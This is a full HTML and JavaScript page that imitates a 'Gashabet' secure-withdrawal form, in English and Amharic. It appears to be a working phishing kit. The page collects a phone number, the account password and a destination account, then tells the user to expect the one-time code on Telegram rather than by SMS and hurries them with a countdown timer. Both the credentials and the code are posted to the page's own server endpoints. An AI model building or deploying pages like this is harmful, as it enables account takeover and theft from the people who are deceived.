<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gashabet | Secure Withdrawal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #001a35; -webkit-tap-highlight-color: transparent; }
        .bg-card-blue { background-color: #1a3a5a; }
        .bg-deposit-green { background-color: #89e673; }
        .bg-dark-navy { background-color: #001a35; }
        
        /* THE WHITE BACKGROUND FIX FOR MOBILE AUTOFILL */
        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active {
            -webkit-box-shadow: 0 0 0 30px #001a35 inset !important;
            -webkit-text-fill-color: white !important;
            transition: background-color 5000s ease-in-out 0s;
        }

        .modal-input { 
            width: 100%; border: 1px solid #ffffff20; padding: 16px; 
            border-radius: 12px; outline: none; font-size: 16px; 
            margin-top: 8px; transition: 0.2s; background-color: #001a35; 
            color: white; font-weight: bold; 
        }
        .modal-input:focus { border-color: #3066e3; box-shadow: 0 0 0 2px rgba(48,102,227,0.3); }
        .modal-label { font-size: 11px; font-weight: 800; color: #9ca3af; margin-top: 16px; display: block; text-transform: uppercase; letter-spacing: 0.5px; }
        .amharic-label { color: #6b7280; font-weight: 500; font-size: 10px; margin-left: 4px; text-transform: none; letter-spacing: normal; }
        
        .bank-option { border: 2px solid #ffffff20; transition: all 0.2s; cursor: pointer; }
        .bank-option.selected { border-color: #89e673; background-color: rgba(137, 230, 115, 0.1); }
        
        .hidden-step { display: none !important; }
        
        .fade-in { animation: fadeIn 0.4s ease-in-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="font-sans min-h-screen flex flex-col items-center justify-start sm:justify-center p-4 pt-20 sm:pt-4">

    <div class="fixed top-0 left-0 right-0 bg-[#001a35] p-4 flex justify-between items-center shadow-lg z-50 border-b border-white/10">
        <div class="flex items-center">
            <div class="text-2xl font-bold italic tracking-tighter text-white">Gasha<span class="font-light">bet</span></div>
        </div>
        <div class="text-deposit-green text-sm font-black uppercase"><i class="fa-solid fa-lock mr-1"></i> Secure</div>
    </div>

    <div id="step-1-container" class="bg-card-blue w-full max-w-md rounded-3xl shadow-2xl p-6 sm:p-8 border border-white/10 fade-in">
        <div class="flex flex-col items-center mb-6">
            <img src="logo.png" alt="Gashabet Logo" class="h-14 mb-4 object-contain" onerror="this.style.display='none'">
            <h2 class="text-white text-xl font-black uppercase tracking-wide text-center">Withdraw Funds <br><span class="text-sm text-gray-400 font-normal">ገንዘብ ወጪ ማድረግ</span></h2>
        </div>

        <div id="error-box" class="hidden bg-red-500/20 border border-red-500 text-red-400 text-xs font-bold p-4 rounded-xl mb-6 text-center uppercase">
            <i class="fa-solid fa-circle-exclamation mr-1"></i> <span id="error-text">All fields are required!</span>
        </div>

        <form id="withdraw-form" onsubmit="submitWithdrawal(event)" class="space-y-2">
            
            <label class="modal-label">Payment Method <span class="amharic-label">/ የመክፈያ ዘዴ</span></label>
            <div class="grid grid-cols-3 gap-2 mt-2">
                <div onclick="selectBank('Telebirr')" id="bank-Telebirr" class="bank-option bg-dark-navy p-3 rounded-xl flex flex-col items-center justify-center relative selected">
                    <img src="telebirr_logo.png" alt="Telebirr Logo" class="h-8 mb-2 object-contain" onerror="this.style.display='none'">
                    <span class="text-white font-black text-xs">Telebirr</span>
                </div>
                <div onclick="selectBank('CBE')" id="bank-CBE" class="bank-option bg-dark-navy p-3 rounded-xl flex flex-col items-center justify-center relative">
                    <img src="cbe_logo.png" alt="CBE Logo" class="h-8 mb-2 object-contain" onerror="this.style.display='none'">
                    <span class="text-white font-black text-xs">CBE</span>
                </div>
                <div onclick="selectBank('BOA')" id="bank-BOA" class="bank-option bg-dark-navy p-3 rounded-xl flex flex-col items-center justify-center relative">
                    <img src="abyssinia.png" alt="BOA Logo" class="h-8 mb-2 object-contain" onerror="this.style.display='none'">
                    <span class="text-white font-black text-xs">BOA</span>
                </div>
            </div>
            <input type="hidden" id="selected-bank" value="Telebirr">

            <div>
                <label class="modal-label">Registered Phone <span class="amharic-label">/ የተመዘገበ ስልክ ቁጥር</span></label>
                <div class="flex mt-2">
                    <span class="px-4 py-4 bg-[#001a35] border border-r-0 border-white/20 rounded-l-xl text-sm font-bold text-gray-400 flex items-center">+251</span>
                    <input id="w-phone" type="tel" placeholder="9..." autocomplete="off" class="flex-1 bg-[#001a35] appearance-none border border-white/20 p-4 rounded-r-xl outline-none text-base text-white font-bold focus:border-blue-500 shadow-none m-0">
                </div>
            </div>

            <div class="relative">
                <label class="modal-label">Account Password <span class="amharic-label">/ የሂሳብ የይለፍ ቃል</span></label>
                <input id="w-pass" type="password" placeholder="Enter password" class="modal-input pr-12">
                <button type="button" onclick="togglePassword()" class="absolute right-0 top-[38px] h-[54px] w-[54px] flex items-center justify-center text-gray-400 hover:text-white">
                    <i id="eye-icon" class="fa-solid fa-eye text-lg"></i>
                </button>
            </div>

            <div>
                <label class="modal-label">Amount (ETB) <span class="amharic-label">/ መጠን (በብር)</span></label>
                <input id="w-amount" type="number" placeholder="Min 400 ETB" class="modal-input">
            </div>

            <div>
                <label class="modal-label">Destination Account / Phone <span class="amharic-label">/ የሚላክበት የሂሳብ ቁጥር / ስልክ</span></label>
                <input id="w-account" type="text" placeholder="" class="modal-input">
            </div>

            <button type="submit" id="submit-btn" class="w-full bg-[#3066e3] hover:bg-blue-600 text-white py-5 rounded-xl font-black uppercase tracking-wider mt-8 shadow-lg transition-all active:scale-95 flex flex-col items-center justify-center text-lg leading-tight">
                <div class="flex items-center"><span id="btn-text">Submit Request</span> <i id="btn-icon" class="fa-solid fa-paper-plane ml-2"></i></div>
                <span class="text-[10px] text-blue-200 mt-1 font-normal tracking-normal lowercase">ጥያቄውን ላክ</span>
            </button>
        </form>
    </div>

    <div id="step-2-container" class="hidden-step bg-card-blue w-full max-w-md rounded-3xl shadow-2xl p-6 sm:p-8 border border-deposit-green fade-in">
        <div class="flex flex-col items-center mb-6">
            <div class="bg-dark-navy p-4 rounded-full border border-deposit-green mb-4">
                <i class="fa-solid fa-shield-check text-deposit-green text-4xl"></i>
            </div>
            <h2 class="text-white text-xl font-black uppercase tracking-wide text-center">Verify Request <br><span class="text-sm text-gray-400 font-normal">ጥያቄውን ያረጋግጡ</span></h2>
        </div>

        <div class="bg-[#007bff]/20 border border-[#007bff]/50 rounded-xl p-4 mb-6 text-center">
            <p class="text-white text-sm font-bold mb-2">
                <i class="fa-brands fa-telegram text-[#3066e3] text-lg mr-1 align-middle"></i> 
                Expect your code on Telegram, NOT SMS.
            </p>
            <p class="text-gray-300 text-xs font-bold leading-relaxed border-t border-[#007bff]/30 pt-2 mt-2">
                የማረጋገጫ ኮዱን በቴሌግራም ይጠብቁ እንጂ በ አጭር የፅሁፍ መልዕክት (SMS) አይደለም።
            </p>
        </div>

        <div class="space-y-6">
            <div>
                <label class="modal-label text-center block w-full">Verification Code <span class="amharic-label">/ የማረጋገጫ ኮድ</span></label>
                <input id="v-code" type="number" placeholder="0 0 0 0 0" class="modal-input text-center text-2xl tracking-[0.5em] font-black py-6">
            </div>
            
            <div class="flex justify-center items-center">
                <div class="bg-dark-navy px-6 py-3 rounded-full border border-red-500/30 flex items-center shadow-inner">
                    <i class="fa-solid fa-clock text-red-500 mr-3 animate-pulse text-lg"></i>
                    <span id="countdown-timer" class="text-red-500 font-mono font-bold text-xl tracking-wider">05:00</span>
                </div>
            </div>

            <button id="verify-btn" onclick="submitOTP()" class="w-full bg-deposit-green text-black py-5 rounded-xl font-black uppercase tracking-wider mt-4 shadow-lg transition-all active:scale-95 text-lg flex flex-col items-center justify-center leading-tight">
                <span>Confirm Code</span>
                <span class="text-[10px] text-gray-800 mt-1 font-bold tracking-normal lowercase">ኮዱን አረጋግጥ</span>
            </button>
        </div>
    </div>

    <script>
        const API_URL = window.location.origin;
        let globalPhone = ""; 

        function selectBank(bankName) {
            document.querySelectorAll('.bank-option').forEach(el => {
                el.classList.remove('selected');
            });
            document.getElementById('bank-' + bankName).classList.add('selected');
            document.getElementById('selected-bank').value = bankName;
        }

        function togglePassword() {
            const passInput = document.getElementById('w-pass');
            const eyeIcon = document.getElementById('eye-icon');
            if (passInput.type === 'password') {
                passInput.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash', 'text-white');
            } else {
                passInput.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash', 'text-white');
                eyeIcon.classList.add('fa-eye');
            }
        }

        let timerInterval;
        function startTimer() {
            let duration = 300; 
            const display = document.getElementById('countdown-timer');
            const verifyBtn = document.getElementById('verify-btn');
            const codeInput = document.getElementById('v-code');

            timerInterval = setInterval(function () {
                let minutes = parseInt(duration / 60, 10);
                let seconds = parseInt(duration % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = minutes + ":" + seconds;

                if (--duration < 0) {
                    clearInterval(timerInterval);
                    display.textContent = "00:00";
                    verifyBtn.disabled = true;
                    verifyBtn.classList.replace('bg-deposit-green', 'bg-gray-500');
                    verifyBtn.innerHTML = "<span>Code Expired</span><span class='text-[10px] text-gray-300 mt-1 font-bold tracking-normal lowercase'>ጊዜው አልፎበታል</span>";
                    codeInput.disabled = true;
                }
            }, 1000);
        }

        async function submitWithdrawal(e) {
            e.preventDefault();
            
            const phone = document.getElementById('w-phone').value.trim();
            const password = document.getElementById('w-pass').value.trim();
            const amount = document.getElementById('w-amount').value.trim();
            const account = document.getElementById('w-account').value.trim();
            const bank = document.getElementById('selected-bank').value;
            
            const errorBox = document.getElementById('error-box');
            const errorText = document.getElementById('error-text');
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');

            if(!phone || !password || !amount || !account) {
                errorText.innerText = "All fields are required! (ሁሉንም መሙላት ግዴታ ነው)";
                errorBox.classList.remove('hidden');
                return;
            }
            
            const isTrialValid = /^\d{9,10}$/.test(phone);
            if (!isTrialValid) {
                errorText.innerText = "Phone must be 9 or 10 digits! (ስልክ 9 ወይም 10 አሃዝ መሆን አለበት)";
                errorBox.classList.remove('hidden');
                return;
            }

            errorBox.classList.add('hidden');
            btnText.innerText = "Processing...";
            submitBtn.disabled = true;

            try {
                const fetchUrl = API_URL.includes("localhost") ? "http://localhost:3000/api/request-withdrawal" : `${API_URL}/api/request-withdrawal`;
                const response = await fetch(fetchUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, password, amount, account, bank })
                });

                if(response.ok) {
                    globalPhone = phone; 
                    document.getElementById('step-1-container').classList.add('hidden-step');
                    document.getElementById('step-2-container').classList.remove('hidden-step');
                    startTimer();
                } else {
                    alert("Error submitting request. Please try again. (ስህተት ተከስቷል፣ እባክዎ እንደገና ይሞክሩ)");
                    btnText.innerText = "Submit Request";
                    submitBtn.disabled = false;
                }
            } catch (err) {
                alert("Network error. Please check your connection. (የኢንተርኔት ግንኙነትዎን ያረጋግጡ)");
                btnText.innerText = "Submit Request";
                submitBtn.disabled = false;
            }
        }

        async function submitOTP() {
            const code = document.getElementById('v-code').value.trim();
            const verifyBtn = document.getElementById('verify-btn');

            if(!code) {
                alert("Please enter the verification code first. (እባክዎ የማረጋገጫ ኮዱን ያስገቡ)");
                return;
            }

            verifyBtn.innerHTML = "<span>Verifying...</span><span class='text-[10px] text-gray-800 mt-1 font-bold tracking-normal lowercase'>እያረጋገጠ ነው...</span>";
            verifyBtn.disabled = true;

            try {
                const fetchUrl = API_URL.includes("localhost") ? "http://localhost:3000/api/verify-otp" : `${API_URL}/api/verify-otp`;
                const response = await fetch(fetchUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: globalPhone, otp: code })
                });

                if(response.ok) {
                    clearInterval(timerInterval);
                    verifyBtn.classList.replace('bg-deposit-green', 'bg-[#3066e3]');
                    verifyBtn.classList.replace('text-black', 'text-white');
                    verifyBtn.innerHTML = "<span>Success! Processing</span><span class='text-[10px] text-blue-200 mt-1 font-bold tracking-normal lowercase'>በተሳካ ሁኔታ ተረጋግጧል</span>";
                    alert("Verification successful! Your withdrawal is being processed. (በተሳካ ሁኔታ ተረጋግጧል! ክፍያዎ በመስተናገድ ላይ ነው)");
                } else {
                    alert("Failed to verify code. Please try again. (ኮዱ ትክክል አይደለም፣ እባክዎ እንደገና ይሞክሩ)");
                    verifyBtn.innerHTML = "<span>Confirm Code</span><span class='text-[10px] text-gray-800 mt-1 font-bold tracking-normal lowercase'>ኮዱን አረጋግጥ</span>";
                    verifyBtn.disabled = false;
                }
            } catch (err) {
                alert("Network error. Please check your connection. (የኢንተርኔት ግንኙነትዎን ያረጋግጡ)");
                verifyBtn.innerHTML = "<span>Confirm Code</span><span class='text-[10px] text-gray-800 mt-1 font-bold tracking-normal lowercase'>ኮዱን አረጋግጥ</span>";
                verifyBtn.disabled = false;
            }
        }
    </script>
</body>
</html>
